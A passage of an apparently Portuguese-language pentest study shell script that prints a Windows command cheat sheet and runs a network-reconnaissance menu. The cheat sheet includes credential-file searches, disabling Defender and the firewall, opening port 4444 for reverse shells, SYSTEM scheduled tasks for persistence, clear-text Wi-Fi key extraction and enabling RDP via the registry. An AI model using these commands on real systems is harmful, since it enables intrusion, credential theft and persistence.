        echo -e "${RED}type arquivo.txt | sort ${GRAY}# O comando sort é executado em cima do resultado do comando type.${RESET}"
        echo -e ""
        echo -e "${RED}2>nul ${GRAY}# Omite a saída de erros de um comando.${RESET}"
        echo -e ""
    }
    function findstr_cmd(){
        echo -e "${WHITE}################### FINDSTR #######################${RESET}"
        echo -e "${RED}findstr \"string\" <arquivo.txt> ${GRAY}# Exibe apenas as linhas do arquivo.txt que possuam a string especificada.${RESET}"
        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>nul ${GRAY}# Procura, em todos os arquivos a partir do diretório atual, por arquivos que contenham a string especificada.${RESET}"
        echo -e ""
    }
    function attrib_cmd(){
        echo -e "${WHITE}################### ATTRIB #######################${RESET}"
        echo -e "${RED}attrib ${GRAY}# Exibe os atributos dos arquivos do diretório atual.${RESET}"
        echo -e "${RED}attrib /d ${GRAY}# Exibe os atributos dos arquivos e diretórios do diretório atual. ${RESET}"
        echo -e "${RED}attrib /s ${GRAY}# Exibe os atributos dos arquivos do diretório atual e dos arquivos nos subdiretórios.${RESET}"
        echo -e ""
        echo -e "${RED}attrib +S +H <arquivo> ${GRAY}# Deixa um arquivo oculto e não mostra esse arquivo, quando aberto pela interface gráfica, mesmo com a opção de "mostrar arquivos ocultos" estando ativa.${RESET}"
        echo -e ""
    }
    function cmd4enum_cmd(){
        echo -e "${WHITE}################### CMD 4 ENUM #######################${RESET}"
        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config*${RESET}"
        echo -e "${RED}tree /f${RESET}"
        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>null${RESET}"
        echo -e ""
    }
    function icalcs(){
        echo -e "${WHITE}################### ICALCS #######################${RESET}"
        echo -e "${RED}ICACLS: —> Lista e gerencia as DACL (informações de permissão) das pastas/arquivos.${RESET}"
        echo -e ""
        echo -e "${GRAY}Exemplo:${RESET}"
        echo -e "${BLUE}> icacls \"arquivo 2.txt\"${RESET}"
        echo -e "${GRAY}#arquivo 2.txt AUTORIDADE NT\SISTEMA:(I)(F) -- SYSTEM${RESET}"
	    echo -e "${GRAY}#              BUILTIN\Administradores:(I)(F) -- USUARIOS ADMIN${RESET}"
	    echo -e "${GRAY}#              DESKTOP-JPMQF3L\aluno:(I)(F) -- USUARIO aluno MAQUINA JPMQF3L${RESET}"
        echo -e ""
        echo -e "${RED}icacls arquivo /grant aluno:F ${GRAY}# Adicionar permissões${RESET}"
        echo -e ""
        echo -e "${RED}icacls arquivo /deny aluno:F ${GRAY}# Negar permissões${RESET}"
        echo -e ""
        echo -e "${RED}whoami /groups ${GRAY}# Verificar o nível de integridade${RESET}"
    }
    function system_info(){
        echo -e ""
        echo -e "${WHITE}################### INFORMAÇOES DO SISTEMA #######################${RESET}"
        echo -e "${RED}hostname ${GRAY}# Exibe o nome do host${RESET}"
        echo -e ""
        echo -e "${RED}netstat -ano ${GRAY}# Mostra serviços com portas e conexões ativas.${RESET}"
        echo -e ""
        echo -e "${RED}ver ${GRAY}# Exibe a build do sistema${RESET}"
        echo -e ""
        echo -e "${RED}systeminfo ${GRAY}# Exibe informações do sistema${RESET}"
        echo -e ""
        echo -e "${RED}winver ${GRAY}# Exibe a versão, build e SO.${RESET}"
        echo -e ""
    }
    function processos_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE PROCESSOS #######################${RESET}"
        echo -e "${GRAY}Processo corresponde a uma instância de um programa, ou seja, um programa que está sendo executado no sistema operacional, consumindo recursos.${RESET}"
        echo -e ""
        echo -e "${RED}wmic product get name,version,installlocation ${GRAY}# Lista os programas instalados no sistema, assim como suas versões e locais onde estão instalado.${RESET}"
        echo -e ""
        echo -e "${RED}tasklist ${GRAY}# Lista os processos ativos, nomes, PID, etc...${RESET}"
        echo -e "${RED}tasklist /M ${GRAY}# lista as DLL que cada processo usa${RESET}"
        echo -e "${RED}tasklist /SVC ${GRAY}# lista os serviços relacionados com esse processo${RESET}"
        echo -e "${RED}tasklist /V ${GRAY}# Mostra qual usuário está utilizando determinado processo${RESET}"
        echo -e ""
        echo -e "${RED}taskkill /pid xxxx /f ${GRAY}# Mata determinado processo ativo (Ex: taskkill /pid 3395).${RESET}"
        echo -e ""
    }
    function usuarios_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE USUARIOS #######################${RESET}"
        echo -e "${RED}net user ${GRAY}# Listar usuários da maquina${RESET}"
        echo -e "${RED}net user <usuario> ${GRAY}# Ver detalhes do usuário (grupos, etc)${RESET}"
        echo -e "${RED}net localgroup ${GRAY}# Lista grupos existentes na máquina${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> ${GRAY}# Ver quais usuários estão em determinado grupo${RESET}"
        echo -e "${RED}net user <novo_usuario> <nova_senha> /add ${GRAY}# Criar novo usuário${RESET}"
        echo -e "${RED}net user <usuario> /del ${GRAY}# Remover o usuário especificado ${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /add ${GRAY}# Adicionar o usuário especificado no grupo especificado${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /del ${GRAY}# Remover o usuário especificado no grupo especificado ${RESET}"
        echo -e "${RED}net user <usuario> <nova_senha> ${GRAY}# Alterar senha de um usuário${RESET}"
        echo -e "${RED}net user <usuario> /active:yes ${GRAY}# Habilitar ou desabilitar usuário (yes ou no)${RESET}"
        echo -e ""
    }
    function firewall_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE FIREWALL #######################${RESET}"
        echo -e "${RED}netsh advfirewall show currentprofile ${GRAY}# Mostra o status do firewall (apenas o perfil ativo)"
        echo -e "${RED}netsh advfirewall set allprofiles state off ${GRAY}# Desabilita o firewall do Windows."
        echo -e "${RED}netsh advfirewall set allprofiles state on ${GRAY}# Habilita o firewall do Windows."
        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp program=\"C:\caminho\programa.exe\" enable=yes ${GRAY}# Permitir que um programa especifico no echo -e firewall."
        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp localport=4444 enable=yes ${GRAY}# Abrir a porta especificada no firewallecho -e "
        echo -e ""
        echo -e "${GRAY}# dir = in | out"
        echo -e "${GRAY}# action = allow|block"
        echo -e "${GRAY}# protocol = TCP | UDP |any"
        echo -e "${GRAY}# Obs: As portas 80 e 443 costumam estar abertas para conexões de saída. Interessante tentar utilizar essas portas para obter um shell reverso."
        echo -e ""
    }
    function antivirus_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE ANTIVIRUS #######################${RESET}"
        echo -e "${GRAY}Sequencia de comandos para tentar desabilitar o Windows defender, utilizando o powershell. Não é necessário reiniciar a máquina. Mudar para ${GREEN} \$false ${RESET}${GRAY} caso queira reativar:${RESET}"
        echo -e ""
        echo -e "${RED}powershell.exe Set-MpPreference -DisableRealTimeMonitoring \$true ${GRAY}# Desabilita o scan em tempo real${RESET}"
        echo -e ""
        echo -e "${GRAY}No Windows a partir da ${GREEN}build 18305, a proteção contra violações do Windows defender deve estar desativada.${RESET}${GRAY} Para verificar se a proteção contra violações está ativa, use o comando:"
        echo -e ""
        echo -e "${RED}powershell.exe Get-MpComputerStatus${RESET}"
        echo -e ""
        echo -e "${GRAY}Na saída do comando acima, ${RED}procurar por \"IsTamperProtected\". Caso esteja como true, não será possível desabilitar o Windows defender via terminal.${RESET}"
        echo -e ""
    }
    function tarefas_agendadas_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE TAREFAS AGENDADAS #######################${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /query /v /fo list ${GRAY}# Lista as tarefas agendadas disponíveis no sistema. Filtrar saída com findstr para buscar algo especifico.${RESET}"
        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".exe\" ${GRAY}# Exemplo${RESET}"
        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".bat\" ${GRAY}# Exemplo${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"dominio\usuário\" /RP \"senha_do_usuário\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário especificado, a cada minuto.${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"system\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário system, a cada minuto (Precisa ser executado por um terminal com privilégio [obter persistência após explorar um alvo]).${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /run /I /TN \"nome_da_tarefa_agendada\" ${GRAY}# Executar imediatamente determinada tarefa agendada. ${RESET}"
        echo -e "${RED}schtasks /delete /tn \"nome_da_tarefa\" ${GRAY}# Deletar uma tarefa agendada.${RESET}"
        echo -e "${RED}schtasks /delete /tn \"windowsupdate\"${RESET}"
        echo -e ""
    }
    function servicos_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE SERVIÇOS #######################${RESET}"
        echo -e ""
        echo -e "${RED}sc query ${GRAY}# lista os serviços ativos.${RESET}"
        echo -e "${RED}sc query state= all ${GRAY}# Lista todos os serviços${RESET}"
        echo -e ""
        echo -e "${RED}wmic service get name,pathname,startmode,startname ${GRAY}# Mostra os serviços, com alguns filtros${RESET} "
        echo -e ""
        echo -e "${RED}sc query state= all | findstr \"NOME_DO_SERVIÇO\" ${GRAY}# Lista apenas os nomes dos serviços (Para Windows em português)${RESET}"
        echo -e ""
        echo -e "${RED}sc create \"nome_do_serviço\" binPath= \"caminho_do_executável\" DisplayName= \"descrição_do_serviço\" start= \"auto\" obj= \".\ LocalSystem\" ${GRAY}# Criar um novo serviço, que será executado pelo usuário system.${RESET}"
        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
        echo -e "${YELLOW}${BG_BLACK}##### - Atenção para o espaço após os sinais de " = " !!! ######${RESET}"
        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
        echo -e ""
        echo -e "${RED}sc qc <nome_do_servico> ${GRAY}# Mostra configurações e informações de um serviço.${RESET}"
        echo -e "${RED}sc start <nome_do_servico> ${GRAY}# Inicia um serviço${RESET}"
        echo -e "${RED}sc stop <nome_do_servico> ${GRAY}# Para um serviço${RESET}"
        echo -e "${RED}sc delete \"nome_do_serviço\" ${GRAY}# Exclui um serviço${RESET}"
        echo -e "${RED}sc config <nome_do_servico> binPath= <novo_caminho_do_executavel> ${GRAY}# Exemplo de comando para mudar o caminho do executável que o serviço executa.${RESET}"
        echo -e ""
    }
    function extracao_senhas(){
        echo -e "${WHITE}################### EXTRAÇÃO DE SENHAS #######################${RESET}"
        echo -e ""
        echo -e "${RED}netsh wlan show profiles ${GRAY}# Mostra as redes wi-fi que estão salvas na maquina.${RESET}"
        echo -e "${RED}netsh wlan show profiles name=\"nome_da_rede\" key=clear ${GRAY}# Exibe algumas informações da rede wi-fi salva, inclusive a senha em claro.${RESET}"
        echo -e ""

    }
    function registros_windows(){
        echo -e "${WHITE}################### REGISTRO DO WINDOWS #######################${RESET}"
        echo -e "${RED}HKEY_CLASSES_ROOT (HKCR)${GRAY}: Presente nas versões atuais do Windows apenas para manter a compatibilidade com programas mais antigos.${RESET}"
        echo -e "${RED}HKEY_CURRENT_USER (HKCU)${GRAY}: Contém todas as configurações do usuário logado no sistema.${RESET}"
        echo -e "${RED}HKEY_LOCAL_MACHINE (HKLM)${GRAY}: Chave mais importante do registro, guarda todas as informações que o sistema operacional precisa para funcionar e de sua interface gráfica. Utiliza o arquivo SYSTEM para armazenar essas configurações.${RESET}"
        echo -e "${RED}HKEY_USERS (HKU)${GRAY}: Guarda as configurações de aparência do Windows e as configurações efetuadas pelos usuários, como papel de parede, protetor de tela, temas e outros.${RESET}"
        echo -e "${RED}HKEY_CURRENT_CONFIG (HKCC)${GRAY}: Salva os perfis de hardware utilizados pelo usuário.${RESET}"
        echo -e "${RED}HKEY_LOCAL_MACHINE\Software\RegisteredApplications${GRAY} = subchave \"RegisteredApplications\" da subchave \"Software\" da chave HKEY_LOCAL_MACHINE.${RESET}"
        echo -e ""
        echo -e "${YELLOW}Através do registro do Windows, é possível mudar o comportamento padrão de alguns programas do Sistema Operacional, assim como é possível conseguir algumas informações importantes, como versão de programas, senhas, etc${RESET}"
        echo -e "${GRAY}Exemplos:"
        echo -e "   ${RED}\"HKLM\SOFTWARE\RealVNC\WinVNC4\" /v password ${GRAY}# O programa RealVNC salva a senha criptografada no seguinte valor do registro${RESET}"
        echo -e "   ${RED}\"HKCU\Software\SimonTatham\PuTTY\" ${GRAY}# O programa PuTTY salva detalhes sobre conexões realizadas utilizando o programa, na seguinte subchave${RESET}"
        echo -e "   ${RED}\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections ${GRAY}# O windows utiliza o seguinte valor para habilitar/desabilitar o acesso remoto ao sistema${RESET}"
        echo -e ""
        echo -e "${YELLOW}REGISTRO DO WINDOWS - Interagindo via terminal${RESET}"
        echo -e "   ${RED}reg query chave\subchave\subchave\subchave ${GRAY}# Comando para ver os valores e subchaves contido no caminho especificado.${RESET} "
        echo -e "   ${RED}reg query \"HKLM\SOFTWARE\WinRAR\Capabilities\FileAssociations\" ${GRAY}# Exemplo${RESET}"
        echo -e "   ${RED}reg add <chave\subchave\subchave> ${GRAY}# Adicionar uma subchave no no registro"
        echo -e "   ${RED}reg add <chave\subchave\subchave> /v <nome_do_valor> /t <tipo> /d <dado> ${GRAY}# Adicionar um valor no registro.${RESET}"
        echo -e "   ${RED}reg delete <chave\subchave\subchave> ${GRAY}# Remover uma chave do registro${RESET}"
        echo -e "   ${RED}reg save <chave\subchave\subchave arquivo_de_saida> ${GRAY}# Copiar chaves/subchaves para um arquivo.${RESET}"
        echo -e ""
        echo -e ">>> !!! IMPORTANTE !!! <<<   ${RED}reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f ${GRAY}# Ao editar essa chave, o protocolo RDP fica ativado na maquina${RESET}"
    } 
    function main_cmd_basicos_windows(){
        comandos_basicos;
        dir_cmd;
        cd_cmd;
        rd_cmd;
        xcopy_cmd;
        whoami_cmd;
        tree_cmd;
        shutdown_cmd;
        findstr_cmd;
        gamb_dir2find;
        attrib_cmd;
        cmd4enum_cmd;
        icalcs;
        system_info;
        processos_gerenciamento;
        usuarios_gerenciamento;
        firewall_gerenciamento;
        antivirus_gerenciamento;
        tarefas_agendadas_gerenciamento
        servicos_gerenciamento;
        registros_windows;
        outros;
    }
    main_cmd_basicos_windows | tee comandos_windows.txt;
    echo "Arquivo comandos_windows.txt gerado para consultas"
    pausa_script;

    # Chamada da função principal do menu principal após pressionar ENTER
    main_menu;


}
#
function xx_cria_script_windows(){
    #!/bin/bash

    echo "Bem-vindo ao gerador de scripts .bat!"

    # Solicitar o nome do script .bat
    read -r -p "Digite o nome do script .bat que você deseja gerar (sem a extensão .bat): " script_name

    # Adicionar a extensão .bat ao nome do script
    script_name="$script_name.bat"

    # Solicitar ao usuário para selecionar algumas opções para o script .bat
    echo "Selecione algumas opções para o script .bat:"
    echo "1. Exibir uma mensagem"
    echo "2. Listar arquivos no diretório"
    echo "3. Limpar a tela"
    echo "4. Navegar entre diretórios"
    echo "5. Criar novo diretório"
    echo "6. Deletar diretório"
    echo "7. Exibir conteúdo de arquivo"
    echo "8. Renomear arquivo/diretório"
    echo "9. Copiar arquivos/diretórios"
    echo "10. Deletar arquivo/diretório"
    echo "11. Mover arquivo/diretório"
    echo "12. Mostrar usuário atual"
    echo "13. Listar diretórios e subdiretórios"
    echo "14. Desligar/Reiniciar o sistema"
    echo "15. Procurar por string em arquivo"
    echo "16. Exibir atributos de arquivos/diretórios"

    read -r -p "Digite os números correspondentes às opções desejadas (separados por espaço): " options

    # Inicializar o conteúdo do script
    script_content=""

    # Função para adicionar comando ao script
    add_command_to_script() {
        local command=$1
        script_content+="@$command\n"
    }

    # Função para adicionar múltiplos comandos ao script
    add_commands_to_script() {
        local commands=$*
        for command in $commands; do
            add_command_to_script "$command"
        done
    }

    # Gerar o script .bat com base nas opções selecionadas
    for option in $options; do
        case $option in
            1)
                add_command_to_script 'echo "Olá, mundo!"'
                ;;
            2)
                add_command_to_script 'dir'
                ;;
            3)
                add_command_to_script 'cls'
                ;;
            4)
                add_command_to_script 'cd'
                ;;
            5)
                add_command_to_script 'md'
                ;;
            6)
                add_command_to_script 'rd'
                ;;
            7)
                add_command_to_script 'type'
                ;;
            8)
                add_command_to_script 'ren'
                ;;
            9)
                add_command_to_script 'xcopy'
                ;;
            10)
                add_command_to_script 'del'
                ;;
            11)
                add_command_to_script 'move'
                ;;
            12)
                add_command_to_script 'whoami'
                ;;
            13)
                add_command_to_script 'tree'
                ;;
            14)
                add_command_to_script 'shutdown'
                ;;
            15)
                add_command_to_script 'findstr'
                ;;
            16)
                add_command_to_script 'attrib'
                ;;
            *)
                echo "Opção inválida: $option"
                ;;
        esac
    done

    # Escrever o conteúdo do script no arquivo .bat
    echo -e "$script_content" > "$script_name"

    echo "Script $script_name gerado com sucesso!"


}
# shellcheck disable=SC2120
function xxi_script_sgt_domingues(){
    # Definindo cores
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[0;33m'
    BLUE='\033[0;34m'
    PURPLE='\033[0;35m'
    CYAN='\033[0;36m'
    NC='\033[0m' # No Color
    # Função para centralizar o texto na tela
    center_line() {
        get_pos
        screen_width=$(tput cols)
        column=$(( (screen_width - ${#2}) / 2 ))
        tput cup "$line" $column
        echo -e "${1}$2${NC}"
    }


    # Função para obter a posição atual do cursor
    get_pos() {
        exec < /dev/tty
        oldstty=$(stty -g)
        stty raw -echo min 0
        echo -en "\033[6n" > /dev/tty
        IFS=';' read -r -d R -a pos
        stty "$oldstty"
        line=$((${pos[0]:2} - 1))
        # shellcheck disable=SC2004
        # shellcheck disable=SC2323
        column=$(((${pos[1]} - 1)))
    }

    # Função para exibir uma linha divisória
    print_line() {
        text="$1"
        echo_before="$2"
        echo_after="$3"
        screen_width=$(tput cols)
        if [[ $echo_before == 1 ]]; then echo; fi
        for i in $(seq 0 1 $((screen_width - 1))); do
            echo -ne "$text=${NC}"
        done
        if [[ $echo_after == 1 ]]; then echo; fi
    }

    # Função para imprimir o título da tela
    print_title() {
        print_line "${PURPLE}" 0 0
        center_line "${NC}" "$1"
    }

    # Função para imprimir o menu principal
    print_menu() {
        print_title "MENU"
        echo -e "${NC}[1] ${BLUE}Networking Tracing"
        echo -e "${NC}[2] ${BLUE}Network Sweeping"
        echo -e "${NC}[3] ${BLUE}Port Scanning"
        echo -e "${NC}[4] ${BLUE}OS Fingerprint"
        echo -e "${NC}[5] ${BLUE}Version Scanning"
        echo -e "${NC}[6] ${BLUE}Vulnerability Scanning"
        echo -e "${NC}[0] Sair"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu de Networking Tracing
    print_tracing_submenu() {
        print_title "Networking Tracing"
        echo -e "${NC}[1] ${BLUE}Netdiscover"
        echo -e "${NC}[2] ${BLUE}Arp-scan"
        echo -e "${NC}[3] ${BLUE}Arping"
        echo -e "${NC}[4] ${BLUE}Traceroute"
        echo -e "${NC}[5] ${BLUE}MTR"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu do Netdiscover
    print_netdiscover_submenu() {
        print_title "Netdiscover"
        echo -e "${NC}[1] ${BLUE}Listar hosts na rede local"
        echo -e "${NC}[2] ${BLUE}Listar hosts na rede local passivamente"
        echo -e "${NC}[3] ${BLUE}Listar hosts na rede local para impressão"
        echo -e "${NC}[4] ${BLUE}Listar hosts na rede local para impressão sem cabeçalho"
        echo -e "${NC}[5] ${BLUE}Listar hosts na rede local a partir de um arquivo de endereços MAC"
        echo -e "${NC}[6] ${BLUE}Listar hosts na rede local relacionados em um arquivo."
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu do Arp-scan
    print_arpscan_submenu() {
            clear # Limpa a tela
            print_title "Arp-scan"
            echo -e "${NC}[1] ${BLUE}Listar hosts na interface eth0 pertencentes a rede 192.168.74.0/24"
            echo -e "${NC}[2] ${BLUE}Listar hosts na interface eth0 pertencentes à rede dessa interface"
            echo -e "${NC}[3] ${BLUE}Listar hosts na interface eth0 silenciosamente"
            echo -e "${NC}[4] ${BLUE}Listar hosts na interface eth0 silenciosamente (sem exibir cabeçalhos)"
            echo -e "${NC}[5] ${BLUE}Listar hosts na interface eth0 a partir de um arquivo de endereços IP"
            echo -e "${NC}[0] Voltar"
            print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu do Arping
    print_arping_submenu() {
        print_title "Arping"
        echo -e "${NC}[1] ${BLUE}Enviar pacotes ARP para 192.168.74.1"
        echo -e "${NC}[2] ${BLUE}Enviar 5 pacotes ARP para 192.168.74.1"
        echo -e "${NC}[3] ${BLUE}Enviar 5 pacotes ARP para 192.168.74.1 com vermose nível 1"
        echo -e "${NC}[4] ${BLUE}Enviar 5 pacotes ARP para 192.168.74.1 com vermose nível 2"
        echo -e "${NC}[5] ${BLUE}Enviar 5 pacotes ARP para 192.168.74.1 com vermose nível 3"
        echo -e "${NC}[6] ${BLUE}Enviar 5 pacotes ARP para 192.168.100.100 com opção para procurar IPs duplicados"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu do Traceroute
    print_traceroute_submenu() {
        print_title "Traceroute"
        echo -e "${NC}[1] ${BLUE}Traceroute para scanme.org"
        echo -e "${NC}[2] ${BLUE}Traceroute para scanme.org com TCP SYN packets ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[3] ${BLUE}Traceroute para scanme.org usando ICMP Echo Request ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[4] ${BLUE}Traceroute para scanme.org com limite de TTL 10 e intervalo de 0.5 segundos"
        echo -e "${NC}[5] ${BLUE}Traceroute para scanme.org especificando a interface de origem e mostrando IPs em vez de nomes de host"
        echo -e "${NC}[6] ${BLUE}Traceroute para scanme.org com limite máximo de saltos 15 e tempo limite de resposta de 0.3 segundos"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu do MTR
    print_mtr_submenu() {
        print_title "MTR"
        echo -e "${NC}[1] ${BLUE}MTR para scanme.org (Default)"
        echo -e "${NC}[2] ${BLUE}MTR para scanme.org para impressão sem resolução de DNS"
        echo -e "${NC}[3] ${BLUE}MTR para scanme.org com UDP"
        echo -e "${NC}[4] ${BLUE}MTR para scanme.org com TCP"
        echo -e "${NC}[5] ${BLUE}MTR para scanme.org com interface gráfica"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu de Networking Sweeping
    print_networking_sweeping_submenu() {
        print_title "Networking Sweeping"
        echo -e "${NC}[1] ${BLUE}Ping Sweep (ICMP Echo Request)"
        echo -e "${NC}[2] ${BLUE}Ping Sweep (ICMP Echo Request) com ARP Request ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[3] ${BLUE}TCP SYN Ping Sweep"
        echo -e "${NC}[4] ${BLUE}ACK Ping Sweep"
        echo -e "${NC}[5] ${BLUE}UDP Ping Sweep ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu de Port Scanning
    print_port_scanning_submenu() {
        print_title "Port Scanning"
        echo -e "${NC}[1] ${BLUE}Scan básico no scanme.nmap.org"
        echo -e "${NC}[2] ${BLUE}Scan TCP SYN no scanme.nmap.org ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[3] ${BLUE}Scan com detecção de serviço no scanme.nmap.org"
        echo -e "${NC}[4] ${BLUE}Scan UDP no scanme.nmap.org ${RED}(SUDO)${BLUE}"
        echo -e "${NC}[5] ${BLUE}Scan nos 10 principais portas no scanme.nmap.org"
        echo -e "${NC}[6] ${BLUE}Scan em um intervalo de portas em um intervalo de IPs"
        echo -e "${NC}[7] ${BLUE}Scan em um intervalo de portas com detecção de serviço em uma rede"
        echo -e "${NC}[8] ${BLUE}Scan em uma lista de IPs de um arquivo"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para imprimir o submenu de OS Fingerprint
    print_os_fingerprint_submenu() {
        print_title "OS Fingerprint"
        echo -e "${NC}[1] ${BLUE}Executar OS Fingerprint para identificar o sistema operacional"
        echo -e "${NC}[2] ${BLUE}Executar OS Fingerprint para obter informações detalhadas"
        echo -e "${NC}[3] ${BLUE}Executar OS Fingerprint para uma análise abrangente"
        echo -e "${NC}[0] Voltar"
        print_line "${PURPLE}" 0 1
    }

    # Função para o menu principal
    main_menu_code_sgt_domingues() {
        while true; do
            clear # Limpa a tela
            print_menu # Imprime o menu principal

            # Solicitação para escolher uma opção do menu principal
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r option

            # Caso para cada opção escolhida no menu principal
            case $option in
                1)
                    tracing_submenu
                    ;;
                2)
                    networking_sweeping_submenu
                    ;;
                3)
                    port_scanning_submenu
                    ;;
                4)
                    os_fingerprint_submenu
                    ;;
                5)
                    echo -e "${PURPLE}Executando Version Scanning...${NC}"
                    # Adicione o comando correspondente aqui
                    ;;
                6)
                    echo -e "${PURPLE}Executando Vulnerability Scanning...${NC}"
                    # Adicione o comando correspondente aqui
                    ;;
                0)
                    clear
                    exit 0 # Sai do programa
                    ;;
                *)
                    print_line "${PURPLE}" 0 1
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para continuar..."
                    read -r
                    ;;
            esac
        done
    }

    # Função para o submenu de Networking Tracing
    tracing_submenu() {
        while true; do
            clear # Limpa a tela
            print_tracing_submenu # Imprime o submenu de Networking Tracing

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r sub_option

            # Caso para cada opção do submenu
            case $sub_option in
                1)
                    netdiscover_submenu
                    ;;
                2)
                    arp_scan_submenu
                    ;;
                3)
                    arping_submenu
                    ;;
                4)
                    traceroute_submenu
                    ;;
                5)
                    mtr_submenu
                    ;;
                0)
                    break # Retorna ao menu principal
                    ;;
                *)
                    print_line "${PURPLE}" 0 1
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para continuar..."
                    read -r
                    ;;
            esac
        done
    }

    # Função para o submenu de Netdiscover
    netdiscover_submenu() {
        while true; do
            clear # Limpa a tela
            print_netdiscover_submenu # Imprime o submenu de Netdiscover

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r netdiscover_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu do Netdiscover
            case $netdiscover_option in
                1)
                    echo -e "Este comando lista todos os hosts ativos na rede local."
                    echo -e "${RED}sudo netdiscover -i eth0 -r 192.168.74.0/24"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    sudo netdiscover -i eth0 -r 192.168.74.0/24
                    ;;
                2)
                    echo -e "Este comando lista todos os hosts ativos na rede local passivamente."
                    echo -e "${RED}sudo netdiscover -i eth0 -r 192.168.74.0/24 -p"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    sudo netdiscover -i eth0 -r 192.168.74.0/24 -p
                    ;;
                3)
                    echo -e "Este comando lista todos os hosts ativos na rede local para impressão."
                    echo -e "${RED}sudo netdiscover -i eth0 -r 192.168.74.0/24 -P"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo netdiscover -i eth0 -r 192.168.74.0/24 -P
                    ;;
                4)
                    echo -e "Este comando lista todos os hosts ativos na rede local para impressão sem cabeçalho"
                    echo -e "${RED}sudo netdiscover -i eth0 -r 192.168.74.0/24 -P -N"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo netdiscover -i eth0 -r 192.168.74.0/24 -P -N
                    ;;
                5)
                    echo -e "Este comando lista todos os hosts ativos na rede local a partir de um arquivo de endereços MAC."
                    echo -e "${RED}sudo netdiscover -i eth0 -r 192.168.40.0/24 -m netdiscover/macs.txt"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    sudo netdiscover -i eth0 -r 192.168.40.0/24 -m netdiscover/macs.txt
                    ;;
                6)
                    echo -e "Este comando lista os hosts na rede local relacionados em um arquivo."
                    echo -e "${RED}sudo netdiscover -i eth0 -l netdiscover/redes.txt"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    sudo netdiscover -i eth0 -l netdiscover/redes.txt
                    ;;
                0)
                    break # Retorna ao submenu Networking Tracing
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Netdiscover..."
            read -r
        done
    }

    # Função para o submenu de Arp-scan
    arp_scan_submenu() {
        while true; do
            clear # Limpa a tela
